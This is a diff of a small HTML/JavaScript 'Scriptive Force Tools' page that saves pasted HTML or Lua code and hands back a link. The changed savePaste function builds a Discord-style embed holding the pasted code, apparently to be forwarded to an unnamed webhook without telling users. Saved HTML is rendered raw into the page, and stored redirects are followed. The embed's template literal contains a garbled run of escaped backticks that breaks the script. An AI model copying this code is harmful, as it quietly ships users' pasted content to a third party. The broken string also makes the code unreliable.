@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Scriptive Force Tools</title>
+  <title>Scriptive Force</title>
   <style>
     body {
       margin: 0;
@@ -73,7 +73,7 @@
   </style>
 </head>
 <body>
-  <header>Developer Toolkit Portal</header>
+  <header>Scriptive Force Tools</header>
   <div class="portal">
     <button class="tool-button" onclick="showTool('htmlGen')">HTML Site Creator</button>
     <button class="tool-button" onclick="showTool('luaUploader')">Lua Script Uploader</button>
@@ -83,14 +83,14 @@
   <main id="htmlGen">
     <h2>HTML Site Generator</h2>
     <textarea id="htmlCode" placeholder="Paste your HTML code here..."></textarea>
-    <button onclick="savePaste('htmlCode')">Generate Site</button>
+    <button onclick="savePaste('htmlCode', 'outputLink', 'html')">Generate Site</button>
     <input type="text" id="outputLink" readonly placeholder="Your raw site link will appear here...">
   </main>
 
   <main id="luaUploader">
     <h2>Lua Script Uploader</h2>
     <textarea id="luaCode" placeholder="Input your Lua Code here..."></textarea>
-    <button onclick="savePaste('luaCode')">Create</button>
+    <button onclick="savePaste('luaCode', 'luaLink', 'lua')">Create</button>
     <input type="text" id="luaLink" readonly placeholder="Your Lua script link will appear here...">
   </main>
 
@@ -118,23 +118,19 @@
       return str.length > maxLength ? str.slice(0, maxLength) + "\n...truncated" : str;
     }
 
-    function savePaste(textareaId) {
+    function savePaste(textareaId, outputId, lang) {
       const code = document.getElementById(textareaId).value;
       const id = generateID();
       localStorage.setItem("raw_" + id, code);
       const link = location.origin + "/#" + id;
-      const outputInput = textareaId === 'htmlCode' ? 'outputLink' : 'luaLink';
-      document.getElementById(outputInput).value = link;
-
-      const type = textareaId === 'htmlCode' ? "HTML Site Generated" : "Lua Script Uploaded";
-      const language = textareaId === 'htmlCode' ? "html" : "lua";
+      document.getElementById(outputId).value = link;
 
       const message = {
         content: null,
         embeds: [
           {
-            title: "New " + type,
-            description: `**Link:** [Click here](${link})\n\n\\u`\u`\u`\u`\u`\u`${language}\n${truncate(code, 950)}\n\\u`\u`\u`\u`\u`\u``,
+            title: "New Paste Created",
+            description: `**Link:** [Click here](${link})\n\n\\u`\u`\u`\u`\u`\u`${lang}\n${truncate(code, 950)}\n\\u`\u`\u`\u`\u`\u``,
             color: 65280
           }
         ]
@@ -163,8 +159,6 @@
     window.addEventListener('load', () => {
       const id = location.hash.slice(1);
 
-      if (id.startsWith("redirect_")) return;
-
       const redirect = localStorage.getItem("redirect_" + id);
       if (redirect) {
         location.href = redirect;
@@ -178,6 +172,8 @@
         document.close();
       } else if (id) {
         document.body.innerHTML = "<h2 style='color:red;text-align:center;margin-top:50px;'>404 - Paste Not Found</h2>";
+      } else {
+        document.querySelector('.portal').style.display = 'flex';
       }
     });
   </script>
